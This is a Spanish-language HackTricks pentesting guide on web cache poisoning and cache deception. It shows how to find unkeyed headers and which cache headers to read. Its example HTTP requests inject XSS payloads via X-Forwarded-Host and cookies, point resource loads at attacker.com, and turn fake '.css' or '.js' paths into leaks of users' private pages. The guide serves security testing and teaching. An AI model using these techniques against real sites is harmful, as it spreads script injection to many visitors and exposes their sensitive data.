# Envenenamiento de Cach√© y Enga√±o de Cach√©

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas comunitarias m√°s avanzadas del mundo.\
¬°Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## La diferencia

> **¬øCu√°l es la diferencia entre el envenenamiento de cach√© web y el enga√±o de cach√© web?**
>
> * En el **envenenamiento de cach√© web**, el atacante hace que la aplicaci√≥n almacene alg√∫n contenido malicioso en la cach√©, y este contenido se sirve desde la cach√© a otros usuarios de la aplicaci√≥n.
> * En el **enga√±o de cach√© web**, el atacante hace que la aplicaci√≥n almacene alg√∫n contenido sensible perteneciente a otro usuario en la cach√©, y luego el atacante recupera este contenido de la cach√©.

## Envenenamiento de Cach√©

El envenenamiento de cach√© tiene como objetivo manipular la cach√© del lado del cliente para forzar a los clientes a cargar recursos que son inesperados, parciales o est√°n bajo el control de un atacante. La magnitud del impacto depende de la popularidad de la p√°gina afectada, ya que la respuesta contaminada se sirve exclusivamente a los usuarios que visitan la p√°gina durante el per√≠odo de contaminaci√≥n de la cach√©.

La ejecuci√≥n de un ataque de envenenamiento de cach√© implica varios pasos:

1. **Identificaci√≥n de Entradas sin Clave**: Estos son par√°metros que, aunque no son necesarios para que se almacene una solicitud en la cach√©, pueden alterar la respuesta devuelta por el servidor. Identificar estas entradas es crucial, ya que pueden ser explotadas para manipular la cach√©.
2. **Explotaci√≥n de las Entradas sin Clave**: Despu√©s de identificar las entradas sin clave, el siguiente paso implica descubrir c√≥mo abusar de estos par√°metros para modificar la respuesta del servidor de una manera que beneficie al atacante.
3. **Asegurar que la Respuesta Envenenada se Almacene en la Cach√©**: El paso final es asegurar que la respuesta manipulada se almacene en la cach√©. De esta manera, cualquier usuario que acceda a la p√°gina afectada mientras la cach√© est√© envenenada recibir√° la respuesta contaminada.

### Descubrimiento: Verificar encabezados HTTP

Por lo general, cuando una respuesta ha sido **almacenada en la cach√©** habr√° un **encabezado que lo indique**, puedes verificar a qu√© encabezados debes prestar atenci√≥n en este post: [**Encabezados de Cach√© HTTP**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Descubrimiento: C√≥digos de error de cach√©

Si piensas que la respuesta se est√° almacenando en una cach√©, podr√≠as intentar **enviar solicitudes con un encabezado incorrecto**, que deber√≠a ser respondido con un **c√≥digo de estado 400**. Luego intenta acceder a la solicitud de forma normal y si la **respuesta es un c√≥digo de estado 400**, sabr√°s que es vulnerable (e incluso podr√≠as realizar un DoS).

Puedes encontrar m√°s opciones en:

{% content-ref url="cache-poisoning-to-dos.md" %}
[cache-poisoning-to-dos.md](cache-poisoning-to-dos.md)
{% endcontent-ref %}

Sin embargo, ten en cuenta que **a veces este tipo de c√≥digos de estado no se almacenan en cach√©**, por lo que esta prueba podr√≠a no ser fiable.

### Descubrimiento: Identificar y evaluar entradas sin clave

Podr√≠as utilizar [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) para **bruteforcear par√°metros y encabezados** que puedan estar **cambiando la respuesta de la p√°gina**. Por ejemplo, una p√°gina podr√≠a estar usando el encabezado `X-Forwarded-For` para indicar al cliente que cargue el script desde all√≠:
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Provocar una respuesta da√±ina desde el servidor back-end

Con el par√°metro/cabecera identificado, verifica c√≥mo est√° siendo **sanitizado** y **d√≥nde** se est√° **reflejando** o afectando la respuesta desde la cabecera. ¬øPuedes abusar de alguna manera (realizar un XSS o cargar un c√≥digo JS controlado por ti? ¬ørealizar un DoS?...)

### Obtener la respuesta en cach√©

Una vez que hayas **identificado** la **p√°gina** que puede ser abusada, qu√© **par√°metro**/**cabecera** utilizar y **c√≥mo** abusar de ella, necesitas obtener la p√°gina en cach√©. Dependiendo del recurso que est√©s intentando cachear, esto podr√≠a llevar algo de tiempo, es posible que necesites intentarlo durante varios segundos.\
La cabecera **`X-Cache`** en la respuesta puede ser muy √∫til, ya que puede tener el valor **`miss`** cuando la solicitud no estaba en cach√© y el valor **`hit`** cuando est√° en cach√©.\
La cabecera **`Cache-Control`** tambi√©n es interesante para saber si un recurso est√° siendo cach√© y cu√°ndo ser√° la pr√≥xima vez que el recurso se vuelva a cachear: `Cache-Control: public, max-age=1800`\
Otra cabecera interesante es **`Vary`**. Esta cabecera se usa a menudo para **indicar cabeceras adicionales** que se tratan como **parte de la clave de cach√©** incluso si normalmente no tienen clave. Por lo tanto, si el usuario conoce el `User-Agent` de la v√≠ctima a la que apunta, puede envenenar la cach√© para los usuarios que utilizan ese `User-Agent` espec√≠fico.\
Otra cabecera relacionada con la cach√© es **`Age`**. Define el tiempo en segundos que el objeto ha estado en la cach√© del proxy.

Al cachear una solicitud, ten **cuidado con las cabeceras que uses** porque algunas de ellas podr√≠an ser **utilizadas inesperadamente** como **clave** y la **v√≠ctima necesitar√° usar esa misma cabecera**. Siempre **prueba** un Envenenamiento de Cach√© con **diferentes navegadores** para verificar si est√° funcionando.

## Ejemplos de Explotaci√≥n

### Ejemplo m√°s sencillo

Una cabecera como `X-Forwarded-For` se est√° reflejando en la respuesta sin sanitizar.\
Puedes enviar una carga √∫til b√°sica de XSS y envenenar la cach√© para que todos los que accedan a la p√°gina sean afectados por XSS:
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Nota que esto envenenar√° una solicitud a `/en?region=uk` y no a `/en`_

### Envenenamiento de cach√© para DoS

{% content-ref url="cache-poisoning-to-dos.md" %}
[cache-poisoning-to-dos.md](cache-poisoning-to-dos.md)
{% endcontent-ref %}

### Uso del envenenamiento de cach√© web para explotar vulnerabilidades en el manejo de cookies

Las cookies tambi√©n podr√≠an reflejarse en la respuesta de una p√°gina. Si puedes abusar de esto para causar un XSS, por ejemplo, podr√≠as ser capaz de explotar XSS en varios clientes que carguen la respuesta de cach√© maliciosa.
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Ten en cuenta que si la cookie vulnerable es muy utilizada por los usuarios, las solicitudes regulares limpiar√°n la cach√©.

### Envenenamiento de cach√© con traves√≠a de ruta para robar la clave de la API <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**Este informe explica**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) c√≥mo fue posible robar una clave de API de OpenAI con una URL como `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` porque cualquier cosa que coincida con `/share/*` se almacenar√° en cach√© sin que Cloudflare normalice la URL, lo cual se hizo cuando la solicitud lleg√≥ al servidor web.

### Uso de m√∫ltiples encabezados para explotar vulnerabilidades de envenenamiento de cach√© web <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

A veces necesitar√°s **explotar varios inputs sin clave** para poder abusar de una cach√©. Por ejemplo, puedes encontrar una **redirecci√≥n abierta** si configuras `X-Forwarded-Host` a un dominio controlado por ti y `X-Forwarded-Scheme` a `http`. **Si** el **servidor** est√° **redirigiendo** todas las **solicitudes HTTP** a HTTPS y utilizando el encabezado `X-Forwarded-Scheme` como el nombre de dominio para la redirecci√≥n. Puedes controlar hacia d√≥nde apunta la p√°gina con la redirecci√≥n.
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Explotando con el encabezado `Vary` limitado

Si descubres que el encabezado **`X-Host`** se est√° utilizando como **nombre de dominio para cargar un recurso JS** pero el encabezado **`Vary`** en la respuesta indica **`User-Agent`**. Entonces, necesitas encontrar una forma de exfiltrar el User-Agent de la v√≠ctima y envenenar la cach√© utilizando ese user agent:
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

Env√≠a una solicitud GET con la solicitud en la URL y en el cuerpo. Si el servidor web utiliza la del cuerpo pero el servidor de cach√© almacena en cach√© la de la URL, cualquier persona que acceda a esa URL en realidad utilizar√° el par√°metro del cuerpo. Como la vulnerabilidad que James Kettle encontr√≥ en el sitio web de Github:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
### Enga√±ando al cach√©

El objetivo del Enga√±o al Cach√© es hacer que los clientes **carguen recursos que van a ser guardados por el cach√© con su informaci√≥n sensible**.

En primer lugar, ten en cuenta que las **extensiones** como `.css`, `.js`, `.png`, etc. suelen estar **configuradas** para ser **guardadas** en el **cach√©**. Por lo tanto, si accedes a `www.example.com/profile.php/nonexistent.js`, es probable que el cach√© almacene la respuesta porque ve la extensi√≥n `.js`. Sin embargo, si la **aplicaci√≥n** est√° **reproduciendo** con el **contenido sensible** del usuario almacenado en _www.example.com/profile.php_, puedes **robar** ese contenido de otros usuarios.

Otras cosas para probar:

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _Usar extensiones menos conocidas como_ `.avif`

Un ejemplo muy claro se puede encontrar en este informe: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
En el ejemplo, se explica que si cargas una p√°gina inexistente como _http://www.example.com/home.php/non-existent.css_, el contenido de _http://www.example.com/home.php_ (**con la informaci√≥n sensible del usuario**) ser√° devuelto y el servidor de cach√© guardar√° el resultado.\
Luego, el **atacante** puede acceder a _http://www.example.com/home.php/non-existent.css_ en su propio navegador y observar la **informaci√≥n confidencial** de los usuarios que accedieron antes.

Ten en cuenta que el **proxy de cach√©** debe estar **configurado** para **cachear** archivos **basados** en la **extensi√≥n** del archivo (_.css_) y no en el tipo de contenido. En el ejemplo _http://www.example.com/home.php/non-existent.css_ tendr√° un tipo de contenido `text/html` en lugar de un tipo MIME `text/css` (que es el esperado para un archivo _.css_).

Aprende aqu√≠ c√≥mo realizar [ataques de Enga√±o al Cach√© abusando del Contrabando de Peticiones HTTP](../http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-deception).
## Herramientas Autom√°ticas

* [**toxicache**](https://github.com/xhzeem/toxicache): Esc√°ner en Golang para encontrar vulnerabilidades de envenenamiento de cach√© web en una lista de URLs y probar m√∫ltiples t√©cnicas de inyecci√≥n.

## Referencias

* [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
* [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
* [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
* [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
* [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas comunitarias m√°s avanzadas del mundo.\
¬°Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, ¬°consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
